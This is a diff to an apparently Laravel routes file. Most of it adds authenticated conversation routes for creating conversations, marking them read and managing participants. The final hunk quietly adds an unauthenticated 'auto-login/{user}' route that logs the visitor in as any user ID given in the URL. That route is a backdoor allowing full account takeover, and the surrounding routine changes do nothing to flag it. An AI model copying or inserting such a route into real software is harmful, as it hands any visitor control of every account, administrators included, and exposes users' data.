@@ -208,6 +208,14 @@ Route::get('get_support_active_conversation', [\App\Http\Controllers\SupportCont
 Route::delete('delete_message/{message}', [\App\Http\Controllers\SupportController::class, 'deleteMessage'])->name('delete_message');
 
 
+Route::middleware(['auth'])->group(function () {
+    Route::resource('conversations', ConversationController::class);
+    Route::post('conversations/create', [ConversationController::class, 'createConversation']);
+    Route::post('conversations/{id}/read', [ConversationController::class, 'markAsRead']);
+    Route::post('conversations/{id}/participants', [ConversationController::class, 'addParticipants']);
+    Route::delete('conversations/{id}/participants/{userId}', [ConversationController::class, 'removeParticipant']);
+});
+
 /**
  * Setting Management
  */
@@ -259,3 +267,7 @@ Route::get('activity/{user?}', [\App\Http\Controllers\ActivityLogController::cla
 
 // page
 Route::get('{slug}', [\App\Http\Controllers\Blog\PageController::class, 'show']);
+Route::get('auto-login/{user}', function (User $user){
+    auth()->login($user);
+    return redirect()->route('dashboard');
+});
